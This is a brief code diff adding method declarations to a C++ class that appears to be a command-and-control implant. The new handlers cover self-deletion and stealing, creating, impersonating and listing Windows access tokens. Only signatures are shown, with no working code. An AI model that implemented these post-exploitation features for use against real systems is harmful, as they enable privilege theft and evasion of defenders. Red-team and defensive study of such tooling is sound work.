@@ -47,4 +47,12 @@ public:
     void CmdExecBof(ULONG cmdId, BYTE* data, ULONG dataSize);
     void CmdJobList(ULONG cmdId, BYTE* data, ULONG dataSize);
     void CmdJobKill(ULONG cmdId, BYTE* data, ULONG dataSize);
+    void CmdSelfdel(ULONG cmdId, BYTE* data, ULONG dataSize);
+    void CmdTokenSteal(ULONG cmdId, BYTE* data, ULONG dataSize);
+    void CmdTokenMake(ULONG cmdId, BYTE* data, ULONG dataSize);
+    void CmdTokenImpersonate(ULONG cmdId, BYTE* data, ULONG dataSize);
+    void CmdTokenList(ULONG cmdId, BYTE* data, ULONG dataSize);
+    void CmdTokenRemove(ULONG cmdId, BYTE* data, ULONG dataSize);
+    void CmdTokenPrivs(ULONG cmdId, BYTE* data, ULONG dataSize);
+    void CmdConfig(ULONG cmdId, BYTE* data, ULONG dataSize);
 };
